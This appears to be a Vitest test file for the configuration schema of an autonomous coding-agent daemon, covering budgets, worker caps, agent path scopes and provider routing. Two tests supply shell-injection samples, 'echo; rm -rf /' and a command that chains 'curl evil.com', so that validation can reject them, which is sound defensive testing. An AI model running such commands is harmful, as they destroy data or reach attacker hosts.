import { describe, it, expect } from 'vitest';
import { z } from 'zod';
import { loadConfig, ConfigSchema } from './config.js';
import { mkdtemp, writeFile } from 'fs/promises';
import { tmpdir } from 'os';
import { join } from 'path';

const validConfig = {
  repo: { owner: 'test-owner', name: 'test-repo' },
  controlPort: 3847,
  pollIntervalMs: 30000,
  maxConcurrentRuns: 1,
  dailyBudget: 50,
  perRunBudget: 10,
  adapter: 'cli' as const,
  branches: { staging: 'staging', production: 'main' },
  webhooks: [],
  validation: {
    gate1Commands: ['vitest run', 'tsc --noEmit'],
    maxFixCycles: 3,
  },
};

describe('ConfigSchema', () => {
  it('validates a complete config', () => {
    const result = ConfigSchema.safeParse(validConfig);
    expect(result.success).toBe(true);
  });

  it('accepts config without repo (DB-mode)', () => {
    const { repo, ...rest } = validConfig;
    const result = ConfigSchema.safeParse(rest);
    expect(result.success).toBe(true);
  });

  it('applies defaults for optional fields', () => {
    const result = ConfigSchema.safeParse(validConfig);
    if (result.success) {
      expect(result.data.pollIntervalMs).toBe(30000);
      expect(result.data.classifierBatchSize).toBe(10);
      expect(result.data.governance).toEqual({
        documentPath: 'FACTORY_RULES.md',
        maxPrLinesChanged: 2000,
      });
      expect(result.data.agentScopes).toEqual({});
      expect(result.data.runtimeSource).toEqual({
        enabled: true,
        requireClean: true,
        requireExpectedRef: true,
        allowSelfRepair: false,
        onUnhealthy: 'pause',
        ignoredDirtyPaths: ['state/', 'workspaces/', '.claude/scheduled_tasks.lock'],
      });
    }
  });

  it('accepts runtime source policy overrides', () => {
    const result = ConfigSchema.safeParse({
      ...validConfig,
      runtimeSource: {
        enabled: true,
        sourceRoot: '/srv/auto-claude/runtime',
        expectedRef: 'origin/dev',
        requireClean: false,
        requireExpectedRef: true,
        allowSelfRepair: true,
        onUnhealthy: 'warn',
        ignoredDirtyPaths: ['state/', 'logs/'],
      },
    });

    expect(result.success).toBe(true);
    if (result.success) {
      expect(result.data.runtimeSource.expectedRef).toBe('origin/dev');
      expect(result.data.runtimeSource.onUnhealthy).toBe('warn');
    }
  });

  describe('workerCaps (runaway envelope, pilot-overridable)', () => {
    it('omits workerCaps by default (no global cap change)', () => {
      const result = ConfigSchema.safeParse(validConfig);
      expect(result.success).toBe(true);
      if (result.success) {
        expect(result.data.workerCaps).toBeUndefined();
      }
    });

    it('accepts a worker maxTurns + timeoutMs cap for a watched pilot', () => {
      const result = ConfigSchema.safeParse({
        ...validConfig,
        workerCaps: { maxTurns: 15, timeoutMs: 1_200_000 },
      });
      expect(result.success).toBe(true);
      if (result.success) {
        expect(result.data.workerCaps).toEqual({
          maxTurns: 15,
          timeoutMs: 1_200_000,
        });
      }
    });

    it('accepts a partial cap (maxTurns only)', () => {
      const result = ConfigSchema.safeParse({
        ...validConfig,
        workerCaps: { maxTurns: 15 },
      });
      expect(result.success).toBe(true);
      if (result.success) {
        expect(result.data.workerCaps?.maxTurns).toBe(15);
        expect(result.data.workerCaps?.timeoutMs).toBeUndefined();
      }
    });

    it('rejects a non-positive maxTurns cap', () => {
      const result = ConfigSchema.safeParse({
        ...validConfig,
        workerCaps: { maxTurns: 0 },
      });
      expect(result.success).toBe(false);
    });

    it('rejects a non-positive timeoutMs cap', () => {
      const result = ConfigSchema.safeParse({
        ...validConfig,
        workerCaps: { timeoutMs: 0 },
      });
      expect(result.success).toBe(false);
    });
  });

  it('accepts directory scope overrides per agent type', () => {
    const result = ConfigSchema.safeParse({
      ...validConfig,
      agentScopes: {
        worker: {
          readPaths: ['src/**'],
          writePaths: ['src/generated/**'],
          denyPaths: ['src/generated/private/**'],
        },
      },
    });

    expect(result.success).toBe(true);
    if (result.success) {
      expect(result.data.agentScopes.worker?.writePaths).toEqual([
        'src/generated/**',
      ]);
    }
  });

  it('accepts governance guardrail overrides', () => {
    const result = ConfigSchema.safeParse({
      ...validConfig,
      governance: {
        documentPath: '.auto-claude/FACTORY_RULES.md',
        maxPrLinesChanged: 750,
      },
    });

    expect(result.success).toBe(true);
    if (result.success) {
      expect(result.data.governance.maxPrLinesChanged).toBe(750);
    }
  });

  it('accepts classifier batch size override', () => {
    const result = ConfigSchema.safeParse({
      ...validConfig,
      classifierBatchSize: 25,
    });

    expect(result.success).toBe(true);
    if (result.success) {
      expect(result.data.classifierBatchSize).toBe(25);
    }
  });

  it('accepts multi-provider session runtime config (#480)', () => {
    const result = ConfigSchema.safeParse({
      ...validConfig,
      providers: {
        defaultProvider: 'claude-default',
        fallbackChain: ['codex-planner'],
        definitions: {
          'claude-default': {
            name: 'claude-default',
            adapterClass: 'process-based',
            providerKind: 'claude-cli',
            supportedModelTiers: [
              'standard-capability',
              'higher-capability',
            ],
            cliTool: 'claude',
          },
          'codex-planner': {
            name: 'codex-planner',
            adapterClass: 'process-based',
            providerKind: 'codex-cli',
            supportedModelTiers: ['higher-capability'],
            cliTool: 'codex',
            model: 'gpt-5.5',
            executionFlags: ['exec'],
            required: false,
          },
        },
      },
    });

    expect(result.success).toBe(true);
    if (result.success) {
      expect(result.data.providers?.defaultProvider).toBe('claude-default');
      expect(result.data.providers?.definitions['codex-planner']?.model).toBe(
        'gpt-5.5',
      );
    }
  });

  it('rejects provider fallback entries that are not registered (#480)', () => {
    const result = ConfigSchema.safeParse({
      ...validConfig,
      providers: {
        defaultProvider: 'claude-default',
        fallbackChain: ['missing-provider'],
        definitions: {
          'claude-default': {
            name: 'claude-default',
            adapterClass: 'process-based',
            providerKind: 'claude-cli',
            supportedModelTiers: ['standard-capability'],
          },
        },
      },
    });

    expect(result.success).toBe(false);
  });

  it('rejects invalid classifier batch size', () => {
    expect(
      ConfigSchema.safeParse({ ...validConfig, classifierBatchSize: 0 })
        .success,
    ).toBe(false);
    expect(
      ConfigSchema.safeParse({ ...validConfig, classifierBatchSize: 101 })
        .success,
    ).toBe(false);
  });

  it('accepts IPv4 controlHost values (#248)', () => {
    expect(
      ConfigSchema.safeParse({ ...validConfig, controlHost: '127.0.0.1' })
        .success,
    ).toBe(true);
    expect(
      ConfigSchema.safeParse({ ...validConfig, controlHost: '0.0.0.0' })
        .success,
    ).toBe(true);
  });

  it('rejects hostname controlHost values (#248)', () => {
    for (const controlHost of [
      'localhost',
      'my-server.local',
      'example.com',
      '::1',
    ]) {
      const result = ConfigSchema.safeParse({ ...validConfig, controlHost });

      expect(result.success).toBe(false);
    }
  });

  it('rejects invalid adapter', () => {
    const result = ConfigSchema.safeParse({
      ...validConfig,
      adapter: 'invalid',
    });
    expect(result.success).toBe(false);
  });

  it('rejects gate1Commands with shell injection characters', () => {
    const result = ConfigSchema.safeParse({
      ...validConfig,
      validation: {
        ...validConfig.validation,
        gate1Commands: ['echo; rm -rf /'],
      },
    });
    expect(result.success).toBe(false);
  });

  it('rejects holdoutCommand with shell injection characters', () => {
    const result = ConfigSchema.safeParse({
      ...validConfig,
      validation: {
        ...validConfig.validation,
        holdoutCommand: './run.sh && curl evil.com',
      },
    });
    expect(result.success).toBe(false);
  });

  it('accepts safe gate1Commands and holdoutCommand', () => {
    const result = ConfigSchema.safeParse({
      ...validConfig,
      validation: {
        ...validConfig.validation,
        gate1Commands: ['vitest run', 'tsc --noEmit'],
        holdoutCommand: './run-holdout.sh',
      },
    });
    expect(result.success).toBe(true);
  });
});

describe('roleModels (per-agent-role model selection)', () => {
  // A minimal valid providers block reused across the routing tests. claude-default
  // is a claude-cli provider; codex-xhigh is a codex-cli provider for the
  // "route a role to Codex" path.
  const providers = {
    defaultProvider: 'claude-default',
    fallbackChain: [] as string[],
    definitions: {
      'claude-default': {
        name: 'claude-default',
        adapterClass: 'process-based' as const,
        providerKind: 'claude-cli' as const,
        supportedModelTiers: ['standard-capability', 'higher-capability'],
        cliTool: 'claude',
      },
      'codex-xhigh': {
        name: 'codex-xhigh',
        adapterClass: 'process-based' as const,
        providerKind: 'codex-cli' as const,
        supportedModelTiers: ['higher-capability'],
        cliTool: 'codex',
        model: 'gpt-5.5',
        executionFlags: ['exec'],
      },
    },
  };

  it('defaults roleModels to {} when absent', () => {
    const result = ConfigSchema.safeParse(validConfig);
    expect(result.success).toBe(true);
    if (result.success) {
      expect(result.data.roleModels).toEqual({});
    }
  });

  it('accepts a model-only roleModel without providers configured', () => {
    // A model-only (or modelTier-only) entry is honored by the legacy CliAdapter
    // via def.modelOverride — no providers block required.
    const result = ConfigSchema.safeParse({
      ...validConfig,
      roleModels: { worker: { model: 'claude-opus-4-8' } },
    });
    expect(result.success).toBe(true);
    if (result.success) {
      expect(result.data.roleModels.worker?.model).toBe('claude-opus-4-8');
    }
  });

  it('accepts a modelTier-only roleModel without providers configured', () => {
    const result = ConfigSchema.safeParse({
      ...validConfig,
      roleModels: { classifier: { modelTier: 'higher-capability' } },
    });
    expect(result.success).toBe(true);
  });

  it('rejects an empty roleModel entry (no field set)', () => {
    const result = ConfigSchema.safeParse({
      ...validConfig,
      roleModels: { worker: {} },
    });
    expect(result.success).toBe(false);
  });

  it('rejects a roleModel whose providerBinding is empty (no preferred/fallback)', () => {
    const result = ConfigSchema.safeParse({
      ...validConfig,
      providers,
      roleModels: { worker: { providerBinding: {} } },
    });
    expect(result.success).toBe(false);
  });

  it('accepts a roleModel routing a role to a registered provider (provider-only, no model conflict)', () => {
    const result = ConfigSchema.safeParse({
      ...validConfig,
      providers,
      roleModels: {
        // codex-xhigh pins its own model, so the role must NOT also set model.
        'l2-designer': { provider: 'codex-xhigh' },
        worker: { model: 'claude-opus-4-8' },
      },
    });
    expect(result.success).toBe(true);
    if (result.success) {
      expect(result.data.roleModels['l2-designer']?.provider).toBe(
        'codex-xhigh',
      );
    }
  });

  it('rejects the silent-override trap: role.model set AND selected provider pins its own model', () => {
    // codex-xhigh has model: 'gpt-5.5'. Adapter resolves provider.model ??
    // def.modelOverride, so the role's model would be silently ignored.
    const result = ConfigSchema.safeParse({
      ...validConfig,
      providers,
      roleModels: {
        'l2-designer': { provider: 'codex-xhigh', model: 'claude-opus-4-8' },
      },
    });
    expect(result.success).toBe(false);
  });

  it('rejects the silent-override trap via providerBinding.preferred too', () => {
    const result = ConfigSchema.safeParse({
      ...validConfig,
      providers,
      roleModels: {
        'l2-designer': {
          providerBinding: { preferred: 'codex-xhigh' },
          model: 'claude-opus-4-8',
        },
      },
    });
    expect(result.success).toBe(false);
  });

  it('accepts role.model + provider when the provider def does NOT pin a model', () => {
    // claude-default has no model field, so the role's model is honored.
    const result = ConfigSchema.safeParse({
      ...validConfig,
      providers,
      roleModels: {
        worker: { provider: 'claude-default', model: 'claude-opus-4-8' },
      },
    });
    expect(result.success).toBe(true);
  });

  it('accepts a roleModel with a providerBinding referencing registered providers', () => {
    const result = ConfigSchema.safeParse({
      ...validConfig,
      providers,
      roleModels: {
        'l2-designer': {
          providerBinding: {
            preferred: 'codex-xhigh',
            fallback: ['claude-default'],
          },
        },
      },
    });
    expect(result.success).toBe(true);
  });

  it('rejects a roleModel.provider that is not a registered provider', () => {
    const result = ConfigSchema.safeParse({
      ...validConfig,
      providers,
      roleModels: { worker: { provider: 'nonexistent' } },
    });
    expect(result.success).toBe(false);
  });

  it('rejects a roleModel.providerBinding.preferred that is not registered', () => {
    const result = ConfigSchema.safeParse({
      ...validConfig,
      providers,
      roleModels: {
        worker: { providerBinding: { preferred: 'nonexistent' } },
      },
    });
    expect(result.success).toBe(false);
  });

  it('rejects a roleModel.providerBinding.fallback entry that is not registered', () => {
    const result = ConfigSchema.safeParse({
      ...validConfig,
      providers,
      roleModels: {
        worker: {
          providerBinding: {
            preferred: 'claude-default',
            fallback: ['nonexistent'],
          },
        },
      },
    });
    expect(result.success).toBe(false);
  });

  it('fail-fast: rejects a roleModel that names a provider while providers is undefined', () => {
    // The legacy single-CliAdapter path silently ignores def.provider/
    // providerBinding, so Codex would never be reached. Fail at config load
    // rather than silently degrade.
    const result = ConfigSchema.safeParse({
      ...validConfig,
      roleModels: { worker: { provider: 'codex-xhigh' } },
    });
    expect(result.success).toBe(false);
  });

  it('fail-fast: rejects a roleModel.providerBinding while providers is undefined', () => {
    const result = ConfigSchema.safeParse({
      ...validConfig,
      roleModels: {
        worker: { providerBinding: { preferred: 'codex-xhigh' } },
      },
    });
    expect(result.success).toBe(false);
  });
});

describe('zod v4 compatibility', () => {
  it('uses zod v4 (major version alignment with dashboard)', () => {
    // Regression: daemon used zod v3 while dashboard used v4 (#113)
    // z.toJSONSchema is a v4-only API — its existence proves we run v4
    expect(typeof z.toJSONSchema).toBe('function');
  });

  it('ConfigSchema produces valid JSON schema via z.toJSONSchema', () => {
    const jsonSchema = z.toJSONSchema(ConfigSchema);
    expect(jsonSchema).toHaveProperty('type', 'object');
    expect(jsonSchema).toHaveProperty('properties');
  });

  it('applies nested defaults when outer object is omitted', () => {
    // Regression: zod v4 requires explicit default values for .default()
    const result = ConfigSchema.safeParse({
      dailyBudget: 50,
      perRunBudget: 10,
    });
    expect(result.success).toBe(true);
    if (result.success) {
      expect(result.data.branches).toEqual({
        staging: 'staging',
        production: 'main',
      });
      expect(result.data.validation.maxFixCycles).toBe(3);
      expect(result.data.diagnosis.confidenceThreshold).toBe(0.7);
      expect(result.data.warmup.threshold).toBe(10);
      expect(result.data.governance.documentPath).toBe('FACTORY_RULES.md');
      expect(result.data.agentScopes).toEqual({});
    }
  });
});

describe('loadConfig', () => {
  it('loads and validates a config file', async () => {
    const dir = await mkdtemp(join(tmpdir(), 'config-'));
    const path = join(dir, 'config.json');
    await writeFile(path, JSON.stringify(validConfig));
    const result = await loadConfig(path);
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.value.repo?.owner).toBe('test-owner');
      expect(result.value.controlPort).toBe(3847);
    }
  });

  it('returns err for missing file', async () => {
    const result = await loadConfig('/tmp/nonexistent-config.json');
    expect(result.ok).toBe(false);
  });

  it('returns err for invalid config', async () => {
    const dir = await mkdtemp(join(tmpdir(), 'config-'));
    const path = join(dir, 'config.json');
    await writeFile(path, JSON.stringify({ adapter: 'invalid' }));
    const result = await loadConfig(path);
    expect(result.ok).toBe(false);
  });
});
